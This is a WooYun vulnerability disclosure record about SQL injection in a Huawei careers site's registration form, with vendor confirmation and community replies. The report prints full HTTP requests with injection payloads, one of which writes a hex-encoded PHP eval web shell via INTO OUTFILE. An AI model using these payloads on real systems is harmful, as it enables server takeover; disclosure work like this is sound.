{"id": 72629, "wybug_id": "wooyun-2015-0156878", "wybug_title": "华为某站Getshell", "wybug_corp": "华为技术有限公司", "wybug_author": "′雨。", "wybug_date": "2015-11-29 17:31", "wybug_open_date": "2016-01-16 10:12", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-02：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-01：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-16：\t细节向公众公开  简要描述： Shell 详细说明：  career-whrc.huawei.com/pages/handle/register.handle.php首先先注册了个号  注册了之后 再注册了一次。 在用户名的地方加了个单引号 就提示注册失败了。就应该是注入了。POST /pages/handle/register.handle.php HTTP/1.1Host: career-whrc.huawei.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20100101 Firefox/12.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateProxy-Connection: keep-aliveReferer: http://career-whrc.huawei.com/pages/register.phpCookie: forum-guest=true; TS_think_language=zh-cn; PHPSESSID=ijjbrl8f0s1uctffi4g2d8vtm2; hwsso_uniportal=\"\"; hwsso_login=\"\"Content-Type: application/x-www-form-urlencodedContent-Length: 561account=xiaoyuxxxxx@qq.com&password=xiaoyuasd&password_=xiaoyuasd&nickname=11&name=%E9%9B%A8%E9%9B%A8%E9%9B%A8&sex=%E7%94%B7&phone=18385150614 &graduate_date=2015&diploma=%E6%9C%AC%E7%A7%91&university=%E6%AD%A6%E6%B1%89%E5%A4%A7%E5%AD%A6&college=%E8%BD%AF%E4%BB%B6%E5%AD%A6%E9%99%A2&special=%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B&supervisor=',1,(select user()))#&student_id=150101081111213&major=web#&register_btn=%E6%B3%A8%E5%86%8C注册后 然后登录。雨雨雨主攻方向： root@localhost还是root 但是这里是insert insert 是没办法outfile的 但是突然想起来 每次注册的时候都会检测手机号是否注册过了这种一般都是select查询表中是否还有这个手机号目测就能outfile了。在手机号那里加了个单引号x-large;'>( ! )</span> Warning: mysql_num_rows() expects parameter 1 to be resource, boolean given in C:\\wamp\\www\\HuaweiPortal\\pages\\handle\\register.handle.php on line <i>93</i></th></tr>还出了路径。直接outfile了。POST /pages/handle/register.handle.php HTTP/1.1Host: career-whrc.huawei.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20100101 Firefox/12.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateProxy-Connection: keep-aliveReferer: http://career-whrc.huawei.com/pages/register.phpCookie: forum-guest=true; TS_think_language=zh-cn; PHPSESSID=ijjbrl8f0s1uctffi4g2d8vtm2; hwsso_uniportal=\"\"; hwsso_login=\"\"Content-Type: application/x-www-form-urlencodedContent-Length: 568account=xiaoyuxxxxx@qq.com&password=xiaoyuasd&password_=xiaoyuasd&nickname=11&name=%E9%9B%A8%E9%9B%A8%E9%9B%A8&sex=%E7%94%B7&phone=18385150614' and 0 union select 0x3C3F70687020406576616C28245F504F53545B79755D293B3F3E into outfile 'C:/wamp/www/HuaweiPortal/pages/handle/yuxx.php'# &graduate_date=2015&diploma=%E6%9C%AC%E7%A7%91&university=%E6%AD%A6%E6%B1%89%E5%A4%A7%E5%AD%A6&college=%E8%BD%AF%E4%BB%B6%E5%AD%A6%E9%99%A2&special=%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B&supervisor=',1,(select user()))#&student_id=150101081111213&major=web#&register_btn=%E6%B3%A8%E5%86%8C   漏洞证明：  \n\n大概看了看 问题太多了。。   修复方案：  全局gpc addslashes 一下把   版权声明：转载请注明来源 ′雨。@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-12-02 10:10 厂商回复： 感谢′雨。对华为公司安全的关注，我们已将该漏洞通知了相关的业务部门处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-11-29 17:32 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:1625 漏洞数:244        | WooYun is the Bigest gay place.  网络工...)\t\t \n  前排关注。    \n     2015-11-29 17:33 |    \t\t玉林嘎  \t\t\t( 核心白帽子 |\t\t\t        Rank:900 漏洞数:104        )\t\t \n  可啪~    \n     2015-11-29 17:33 |    \t\twhynot \t\t\t( 普通白帽子  |\t\t\t        Rank:532 漏洞数:94        | 为你解冻冰河 为你放弃世界有何不可)\t\t \n  前排关注雨牛    \n     2015-11-29 17:49 |    \t\tMsyb \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:10        | 非常荣幸加入乌云。)\t\t \n  前    \n     2015-11-29 18:43 |    \t\t牛肉包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:262 漏洞数:66        | baozisec)\t\t \n  膜拜我雨    \n     2015-11-29 20:43 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1072 漏洞数:180        | px1624)\t\t \n  我擦    \n     2015-11-29 22:06 |    \t\tonpu \t\t\t( 普通白帽子  |\t\t\t        Rank:142 漏洞数:36        | 勿忘初心)\t\t \n  膜拜    \n     2015-11-29 22:41 |    \t\toneplusone \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:13        | 三十功名尘与土，八千里路云和月。莫等闲、...)\t\t \n  雨神果然牛逼    \n     2015-11-30 00:18 |    \t\tanswer  \t\t\t( 普通白帽子  |\t\t\t        Rank:397 漏洞数:49        | 答案)\t\t \n  雨牛为了wb居然不发通用  可怕    \n     2015-11-30 07:29 |    \t\tnick被注册 \t\t\t( 普通白帽子  |\t\t\t        Rank:152 漏洞数:25        | 天一)\t\t \n  getshell    \n     2015-11-30 09:21 |    \t\t′雨。  \t\t\t( 普通白帽子  |\t\t\t        Rank:1268 漏洞数:193        | Only Code Never Lie To Me.)\t\t \n  @answer 2333   为了wb啥事都做的出来    \n     2015-11-30 09:42 |    \t\t大师兄 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:7        | 每日必关注乌云)\t\t \n  小李同学周末不搞同学聚会，宅在家撸洞。    \n     2015-11-30 16:38 |    \t\tLar2y \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:12        | 外星人入侵地球，最先阻挡他们的应该是绕在...)\t\t \n  雨神又来下雨了    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}